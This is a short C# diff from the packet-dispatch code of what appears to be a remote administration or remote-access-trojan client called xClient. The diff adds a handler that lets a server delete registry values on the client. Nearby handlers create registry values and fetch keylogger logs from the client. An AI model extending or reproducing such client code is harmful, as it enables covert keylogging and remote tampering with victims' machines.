@@ -144,6 +144,10 @@ namespace xClient.Core.Packets
             {
                 CommandHandler.HandleCreateRegistryValue((ServerPackets.DoCreateRegistryValue)packet, client);
             }
+            else if (type == typeof(ServerPackets.DoDeleteRegistryValue))
+            {
+                CommandHandler.HandleDeleteRegistryValue((ServerPackets.DoDeleteRegistryValue)packet, client);
+            }
             else if (type == typeof(ServerPackets.GetKeyloggerLogs))
             {
                 CommandHandler.HandleGetKeyloggerLogs((ServerPackets.GetKeyloggerLogs)packet, client);
